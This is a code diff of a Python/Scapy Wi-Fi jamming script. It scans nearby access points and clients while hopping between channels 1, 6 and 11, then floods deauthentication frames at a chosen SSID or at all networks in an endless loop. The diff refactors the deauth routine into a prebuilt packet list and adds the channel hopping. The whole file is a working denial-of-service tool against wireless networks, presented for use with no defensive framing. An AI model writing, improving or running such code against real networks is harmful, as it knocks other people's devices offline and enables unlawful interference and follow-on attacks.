@@ -32,8 +32,7 @@ def call_iwconfig():
     for line in proc.communicate()[0].split('\n'):
         if len(line) == 0: continue # Isn't an empty string
         if line[0] != ' ': # Doesn't start with space
-            wired_search = re.search('eth[0-9]|em[0-9]|p[1-9]p[1-9]', line)
-            if not wired_search:
+            if not re.search('eth[0-9]|em[0-9]|p[1-9]p[1-9]', line):
                 iface = line[:line.find(' ')]
                 if 'Mode:Monitor' in line:
                     monitors.append(iface)
@@ -78,33 +77,29 @@ def sniff_callback(pkt):
             pkt.addr2 = pkt.addr2.lower()
 
             if pkt.haslayer(Dot11Beacon) or pkt.haslayer(Dot11ProbeResp):
-                APs_add(clients_APs, APs, pkt)
+                add_APs(clients_APs, APs, pkt)
 
             if pkt.type in [1, 2]:
-                clients_APs_add(clients_APs, pkt.addr1, pkt.addr2)
+                add_client_APs(clients_APs, pkt.addr1, pkt.addr2)
 
 
-def APs_add(clients_APs, APs, pkt):
+def add_APs(clients_APs, APs, pkt):
     ssid       = pkt[Dot11Elt].info
     bssid      = pkt[Dot11].addr3.lower()
     try:
-        ap_channel = str(ord(pkt[Dot11Elt:3].info))
-        chans = ['1', '2', '3', '4', '5', '6', '7', '8', '9', '10', '11']
-        if ap_channel not in chans:
-            return
-            
+        channel = str(ord(pkt[Dot11Elt:3].info))
     except Exception as e:
         return
-
+        
     if len(APs) == 0:
-        return APs.append([bssid, ap_channel, ssid])
+        return APs.append([bssid, channel, ssid])
     else:
         for b in APs:
             if bssid in b[0]:
                 return
-        return APs.append([bssid, ap_channel, ssid])
+        return APs.append([bssid, channel, ssid])
 
-def clients_APs_add(clients_APs, addr1, addr2):
+def add_client_APs(clients_APs, addr1, addr2):
     if len(clients_APs) == 0:
         if len(APs) == 0:
             return clients_APs.append([addr1, addr2, monchannel])
@@ -120,7 +115,6 @@ def clients_APs_add(clients_APs, addr1, addr2):
             return AP_check(addr1, addr2)
         else:
             return clients_APs.append([addr1, addr2, monchannel])
-
 def AP_check(addr1, addr2):
     for ap in APs:
         if ap[0].lower() in addr1.lower() or ap[0].lower() in addr2.lower():
@@ -138,37 +132,35 @@ def get_unique_ssids():
 	for i in unique_ssids:
 		print "SSID:" + str(i) + "    Number of Clients:" + str(unique_ssids[i])
 
-def deauth(ssid):
-    '''
-    addr1=destination, addr2=source, addr3=bssid, addr4=bssid
-    '''
-    pkts = []
+def deauth():
+	if len(deauth_packets_list) > 0:
+		for p in deauth_packets_list:
+			send(p, inter=float(0), count=1)
 
-    if len(clients_APs) > 0:
-        for x in clients_APs:
-            client = x[0]
-            ap = x[1]
-            ch = x[2]
-            if (len(x)==4 and ssid == x[3]) or ssid == "all":
-                deauth_pkt1 = Dot11(addr1=client, addr2=ap, addr3=ap) / Dot11Deauth()
-                deauth_pkt2 = Dot11(addr1=ap, addr2=client, addr3=client) / Dot11Deauth()
-                pkts.append(deauth_pkt1)
-                pkts.append(deauth_pkt2)
-    if len(APs) > 0:
-        for a in APs:
-            ap = a[0]
-            ch = a[1]
-            if ssid == a[2] or ssid == "all":
-                deauth_ap = Dot11(addr1='ff:ff:ff:ff:ff:ff', addr2=ap, addr3=ap) / Dot11Deauth()
-                pkts.append(deauth_ap)
-    if len(pkts) > 0:
-        for p in pkts:
-            send(p, inter=float(0), count=1)
+def deauth_list(ssid):
+	if len(clients_APs) > 0:
+		for x in clients_APs:
+			client = x[0]
+			ap = x[1]
+			ch = x[2]
+			if ((len(x)==4 and ssid == x[3]) or ssid == "all"):
+				deauth_pkt1 = Dot11(addr1=client, addr2=ap, addr3=ap) / Dot11Deauth()
+				deauth_pkt2 = Dot11(addr1=ap, addr2=client, addr3=client) / Dot11Deauth()
+				deauth_packets_list.append(deauth_pkt1)
+				deauth_packets_list.append(deauth_pkt2)
+	if len(APs) > 0:
+		for a in APs:
+			ap = a[0]
+			ch = a[1]
+			if (ssid == a[2] or ssid == "all"):
+				deauth_ap = Dot11(addr1='ff:ff:ff:ff:ff:ff', addr2=ap, addr3=ap) / Dot11Deauth()
+				deauth_packets_list.append(deauth_ap)
+	
 
 if __name__ == "__main__":
     clients_APs = []
     APs = []
-    monchannel = 0
+    deauth_packets_list = []
     unique_ssids = {}
     DN = open(os.devnull, 'w')
     monitor_on = None
@@ -176,8 +168,12 @@ if __name__ == "__main__":
     conf.iface = mon_iface
     mac_address = get_mac_address(mon_iface)
     scan_time = int(raw_input('Enter the amount of time for scanning attack targets: '))
-    sniff(iface=mon_iface,prn=sniff_callback,timeout = scan_time)
-    get_unique_ssids()
+    global monchannel
+    for channel in [1,6,11]:
+		channel_str,monchannel = str(channel),str(channel)
+		proc = Popen(['iw', 'dev', mon_iface, 'set', 'channel', channel_str], stdout=DN, stderr=PIPE)
+		sniff(iface=mon_iface,prn=sniff_callback,timeout = scan_time/3)
+    get_unique_ssids()	
     target = raw_input("Enter the SSID of the network that you would like to jam. Enter \'all\' to jam all networks:")
     while (target not in unique_ssids) and (target != "all"):
 		target = raw_input("Could not find the SSID just entered. Please enter again:")
@@ -185,7 +181,26 @@ if __name__ == "__main__":
         print "Jamming network: "+ target
     else:
 		print "Jamming all networks..."
+	
+    print "Routers:\n" + "-----------------------------"
+    for i in APs:
+		if target == "all" or target == i[2]:
+		    print i
+    print "-----------------------------\n"
+    print "Clients:\n" + "-----------------------------"
+    for j in clients_APs:
+		if target == "all" or target == j[3]:
+		    print j
+    print "-----------------------------\n"
+    
+    deauth_list(target)
+    print "Deauth Packets:\n"
+    print deauth_packets_list
+    
     while True:
-        deauth(target)
+		for i in [1,6,11]: #2.4 GHz Wifi Channel Numbers
+			monchannel = str(i)
+			proc = Popen(['iw', 'dev', mon_iface, 'set', 'channel', monchannel], stdout=DN, stderr=PIPE)
+			deauth()
         
     
